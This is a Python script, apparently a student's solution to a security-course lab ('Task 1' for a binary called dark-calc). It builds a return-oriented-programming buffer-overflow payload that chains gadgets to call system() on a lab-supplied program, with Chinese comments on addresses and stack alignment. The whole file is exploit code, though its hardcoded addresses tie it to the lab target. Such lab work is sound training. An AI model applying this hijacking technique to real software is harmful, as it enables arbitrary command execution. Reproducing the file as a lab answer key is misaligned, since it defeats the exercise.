#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct
import os

def p64(x):
    return struct.pack('<Q', x)

# 确认的地址
ret_gadget  = 0x4019d6     
pop_rdi_ret = 0x401c93     
system_addr = 0x4017e0     
strcpy_dest = 0x6030d0     
exit_addr   = 0x401880     

# 自动检测路径：如果在根目录运行就找 attack/malware，如果在 attack 目录就找 ./malware
if os.path.exists("attack/malware"):
    cmd = b'attack/malware\x00'
else:
    cmd = b'./malware\x00'

padding = b'A' * (24 - len(cmd))

# 组装 Payload
payload = cmd + padding
payload += p64(pop_rdi_ret)    
payload += p64(strcpy_dest)    
payload += p64(system_addr)    
payload += p64(ret_gadget)     # 修复栈对齐，防止 GitHub 崩溃
payload += p64(exit_addr)      # 优雅退出，防止段错误吞掉输出

sys.stdout.buffer.write(payload)